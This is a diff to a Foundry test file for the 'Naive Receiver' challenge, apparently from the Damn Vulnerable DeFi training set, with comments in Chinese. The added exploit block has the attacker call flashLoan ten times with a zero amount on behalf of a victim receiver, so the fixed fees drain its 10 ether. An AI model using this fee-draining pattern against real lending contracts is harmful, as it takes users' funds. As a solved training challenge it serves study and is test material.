@@ -36,11 +36,13 @@ contract NaiveReceiver is Test {
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
         assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
 
+        // 用户部署好的flashLoanReceiver
         flashLoanReceiver = new FlashLoanReceiver(
             payable(naiveReceiverLenderPool)
         );
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
         vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
+        // 该flashLoanReceiver最初拥有10 ether
 
         assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);
 
@@ -49,7 +51,13 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        for(uint256 i;i<10;++i){
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),0); // 没做0检查
+        }
+        vm.stopPrank();
 
+        
         /** EXPLOIT END **/
         validation();
     }
